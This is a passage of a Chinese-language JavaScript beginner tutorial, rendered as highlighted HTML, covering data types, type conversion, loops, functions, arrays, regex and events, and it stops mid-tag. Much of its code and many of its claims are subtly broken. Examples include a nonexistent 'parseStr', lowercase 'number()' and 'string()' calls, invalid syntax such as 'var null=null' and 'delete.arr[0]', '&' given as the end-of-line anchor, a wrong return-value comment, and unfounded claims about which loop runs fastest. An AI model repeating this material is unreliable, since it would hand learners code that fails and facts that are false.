class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="string">&#x27;Number&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">3.146</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">0x23</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="title class_">NaN</span>;  <span class="comment">//简称 not a number  (特殊类型,任何和NAN做运算,返回结果都是NAN.其他数值与NAN做比较返回值都是fales)</span></span><br></pre></td></tr></table></figure><h3 id="字符串类型-String"><a href="#字符串类型-String" class="headerlink" title="字符串类型(String)"></a>字符串类型(String)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;string&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="数组类型-Array"><a href="#数组类型-Array" class="headerlink" title="数组类型(Array)"></a>数组类型(Array)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="comment">//一维数组</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>],[<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>]];<span class="comment">//二维数组</span></span><br></pre></td></tr></table></figure><h3 id="对象类型-Object"><a href="#对象类型-Object" class="headerlink" title="对象类型(Object)"></a>对象类型(Object)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">name</span>:<span class="string">&quot;jack&quot;</span>, age=<span class="number">18</span>, sex=<span class="string">&quot;男&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> z = <span class="keyword">new</span> <span class="title function_">object</span>();</span><br><span class="line"><span class="keyword">var</span> <span class="literal">null</span>=<span class="literal">null</span><span class="comment">//空对象类型</span></span><br></pre></td></tr></table></figure><h3 id="布尔类型-boolean"><a href="#布尔类型-boolean" class="headerlink" title="布尔类型(boolean)"></a>布尔类型(boolean)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bool = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title function_">typeof</span>(bool));<span class="comment">// typeof 检测变量类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//请注意 : 布尔类型必须是小写的  不能是大写.</span></span><br></pre></td></tr></table></figure><p>PS : 双引号与单引号都不能解析变量.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;halo&#x27;str&#x27;world&quot;</span>);<span class="comment">//单引号可以嵌套双引号,双引号可以嵌套单引号,不能单引号相互嵌套.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//想要解析变量 , 可以使用 + 连接符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;哈哈哈&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span>+x+ <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(str);</span><br></pre></td></tr></table></figure><p>如果想让JS执行html代码 , 需要用 反引号 .</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> z = <span class="string">`&lt;table&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;td&gt;test1&lt;/td&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/table&gt;`</span></span><br></pre></td></tr></table></figure><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符 :"></a>特殊字符 :</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\n 换行</span><br><span class="line">\r 回车</span><br><span class="line">\t 制表符tab键</span><br><span class="line"></span><br><span class="line">示例 : </span><br><span class="line"><span class="keyword">var</span> z = <span class="string">&#x27;halo wor\r\nld&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z);</span><br><span class="line"></span><br><span class="line">请注意 : 单引号和双引号可以解析转义字符</span><br></pre></td></tr></table></figure><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换 :"></a>数据类型转换 :</h3><h4 id="转为字符型"><a href="#转为字符型" class="headerlink" title="转为字符型"></a>转为字符型</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.<span class="title function_">toString</span>()</span><br><span class="line"><span class="title class_">String</span>(a)</span><br><span class="line"><span class="title function_">parseStr</span>(a)<span class="comment">//强制转换为字符型</span></span><br></pre></td></tr></table></figure><h4 id="转为数字型"><a href="#转为数字型" class="headerlink" title="转为数字型"></a>转为数字型</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(a)<span class="comment">//强制转换为数字型</span></span><br><span class="line"><span class="title class_">Number</span>(a)</span><br></pre></td></tr></table></figure><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换 :"></a>强制类型转换 :</h4><ul><li>parseInt : 强制转换成整数类型</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;200px&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;200.15&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abc100&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="literal">true</span>/<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//强制转换范围 : 从第一个数字开始 , 到最后一个数字结束 . </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1 . 如果是纯数字的话 则直接返回数字类型的值 </span></span><br><span class="line"><span class="comment">2 . 如果首字母是数字,则截取到第一个不是数字之前的数字返回</span></span><br><span class="line"><span class="comment">3 . 如果首字母不是数字,返回NaN</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="parseFloat-强制转换成小数点"><a href="#parseFloat-强制转换成小数点" class="headerlink" title="parseFloat : 强制转换成小数点"></a>parseFloat : 强制转换成小数点</h4></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;300.14px&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;2.35&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="literal">true</span>; </span><br></pre></td></tr></table></figure><ul><li><h4 id="Number-转成数值类型"><a href="#Number-转成数值类型" class="headerlink" title="Number : 转成数值类型"></a>Number : 转成数值类型</h4></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;200&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;200kg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="title function_">number</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">(1)纯数字转化成数字 如果中间有非数字 则直接返回NaN</span></span><br><span class="line"><span class="comment">(2)true =&gt; 1    false =&gt; 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="String-转换成字符串"><a href="#String-转换成字符串" class="headerlink" title="String : 转换成字符串"></a>String : 转换成字符串</h4></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> bool = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> nulls = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> uns = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">var</span> nums = <span class="number">300</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="title function_">string</span>(bool);</span><br></pre></td></tr></table></figure><ul><li><h4 id="Boolean-转换成布尔类型"><a href="#Boolean-转换成布尔类型" class="headerlink" title="Boolean : 转换成布尔类型"></a>Boolean : 转换成布尔类型</h4></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> z = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="title class_">Boolean</span>(z);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0, 0.0, “”, false, null, undefined, NaN, 这些都为假 其他为真.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换 :"></a>自动类型转换 :</h4><p>1 . 自动计算(用Number自动转换) :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;200&#x27;</span>+<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在JS中 + 代表两种   第一种 : 连接符的作用   第二种 : 运算作用</span></span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行速度最慢 </span></span><br></pre></td></tr></table></figure><h5 id="for…in遍历"><a href="#for…in遍历" class="headerlink" title="for…in遍历"></a>for…in遍历</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> object)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(i);</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行速度中等</span></span><br></pre></td></tr></table></figure><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(i);</span><br><span class="line">    i++;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;<span class="number">10</span>);</span><br><span class="line"><span class="comment">//执行速度最快</span></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">name</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>)&#123;</span><br><span class="line">&#125;<span class="comment">//命名函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">&#125;<span class="comment">//匿名函数</span></span><br></pre></td></tr></table></figure><h5 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">a, b</span>) &#123;<span class="comment">//作为函数调用</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=a;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>=b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">myFunction</span>(<span class="number">10</span>, <span class="number">2</span>);           <span class="comment">// myFunction(10, 2) 返回 20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> <span class="title function_">myFunction</span>(<span class="string">&quot;John&quot;</span>,<span class="number">18</span>);<span class="comment">//使用构造函数调用</span></span><br><span class="line">x.<span class="property">name</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myObject = &#123;<span class="comment">//作为方法调用</span></span><br><span class="line"><span class="title class_">Name</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">fullName</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Name</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObject.<span class="title function_">fullName</span>();         <span class="comment">// 返回 &quot;John Doe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;<span class="comment">//定义对象</span></span><br><span class="line">name : <span class="string">&quot;tom&quot;</span></span><br><span class="line">age : <span class="number">18</span></span><br><span class="line">sex : <span class="string">&quot;男&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.<span class="property">lastName</span>;<span class="comment">//访问对象</span></span><br><span class="line">person[<span class="string">&quot;lastName&quot;</span>]<span class="comment">//访问对象</span></span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> brr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> num = arr[<span class="number">0</span>];<span class="comment">//通过索引号来引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> brr = &#123;</span><br><span class="line">    <span class="attr">first</span>:<span class="string">&quot;tom&quot;</span>,</span><br><span class="line">    <span class="attr">second</span>:<span class="string">&quot;tony&quot;</span>,</span><br><span class="line">    <span class="attr">last</span>:<span class="string">&quot;mary&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = brr[<span class="string">&quot;first&quot;</span>]<span class="comment">//通过对象来引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = arr.<span class="property">length</span><span class="comment">//length属性返回元素的数量</span></span><br><span class="line"><span class="keyword">var</span> y = arr.<span class="title function_">sort</span>()<span class="comment">//以sort()的方式对数组进行排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> last = arr[arr.<span class="property">length</span> - <span class="number">1</span>]<span class="comment">//访问最后一个数组元素</span></span><br><span class="line"><span class="keyword">var</span> a = arr.<span class="title function_">slice</span>(<span class="number">2</span>,<span class="number">4</span>)<span class="comment">//截取[2,4)的元素组成新的数组a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(i)<span class="comment">//遍历数组元素，并打印出来</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">0</span>] = <span class="number">10</span>;<span class="comment">//修改第一个元素的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> brr = arr.<span class="title function_">concat</span>(<span class="number">6</span>,<span class="number">7</span>)<span class="comment">//将6，7与数组arr合并为brr数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr.<span class="title function_">push</span>(<span class="number">4</span>)<span class="comment">//在arr数组末尾添加新的元素</span></span><br><span class="line"></span><br><span class="line">arr[arr.<span class="property">length</span>] = <span class="string">&quot;tom&quot;</span><span class="comment">//添加新元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr.<span class="title function_">pop</span>()<span class="comment">//删除数组最后一个元素</span></span><br><span class="line"></span><br><span class="line">arr.<span class="property">length</span> = <span class="number">2</span><span class="comment">//只保留数组前两个元素，后面的全部移除</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>.<span class="property">arr</span>[<span class="number">0</span>];<span class="comment">//删除数组下标为0的元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i<span class="comment">//执行对大小写不敏感的操作</span></span><br><span class="line"></span><br><span class="line">g<span class="comment">//执行全局匹配</span></span><br><span class="line"></span><br><span class="line">m<span class="comment">//执行多行匹配</span></span><br></pre></td></tr></table></figure><h3 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[abc]<span class="comment">//查找方括号之间的任何字符</span></span><br><span class="line">[<span class="number">0</span>-<span class="number">9</span>]<span class="comment">//查找任何从0到9的数字</span></span><br><span class="line">(x|y)<span class="comment">//查找任何以|分隔的选项</span></span><br></pre></td></tr></table></figure><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">\d<span class="comment">//匹配单个数字，等价于[0-9]</span></span><br><span class="line">\D<span class="comment">//匹配单个非数字，等价于[^0-9]</span></span><br><span class="line"></span><br><span class="line">\s<span class="comment">//匹配任意单个的空白字符</span></span><br><span class="line">\S<span class="comment">//匹配任意单个非空白字符</span></span><br><span class="line"></span><br><span class="line">\w<span class="comment">//匹配单个的数字、字母下划线</span></span><br><span class="line">\W<span class="comment">//匹配单个非数字、字母下划线</span></span><br><span class="line"></span><br><span class="line">[^范围]<span class="comment">//匹配任意一个除了括号范围内的字符</span></span><br><span class="line">^<span class="comment">//行首匹配，必须以这个正则开头</span></span><br><span class="line">&amp;<span class="comment">//行尾匹配，必须以这个正则结尾</span></span><br><span class="line">    </span><br><span class="line">\.      <span class="comment">//代表本来.的意思</span></span><br><span class="line">\*      <span class="comment">//代表本来*的意思</span></span><br><span class="line">    </span><br><span class="line">?<span class="comment">//非贪婪模式，匹配0个或者1个字符</span></span><br><span class="line">+<span class="comment">//匹配一次或多次字符</span></span><br><span class="line">*<span class="comment">//匹配0次或多次字符</span></span><br><span class="line">&#123;m,n&#125;<span class="comment">//至少匹配m个字符，最多匹配n个字符</span></span><br><span class="line">&#123;n&#125;<span class="comment">//必须匹配n个字符</span></span><br><span class="line">(abc)+<span class="comment">//小括号括起来的部分是当作单个字符处理</span></span><br></pre></td></tr></table></figure><h3 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</span></span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</span></span><br></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><h3 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//单击事件</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">ondblclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//双击事件</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//右键事件</span></span><br></pre></td></tr></table></figure><h3 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onblur</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//失去焦点</span></span><br><span class="line"></span><br><span class="line"><span class="variable 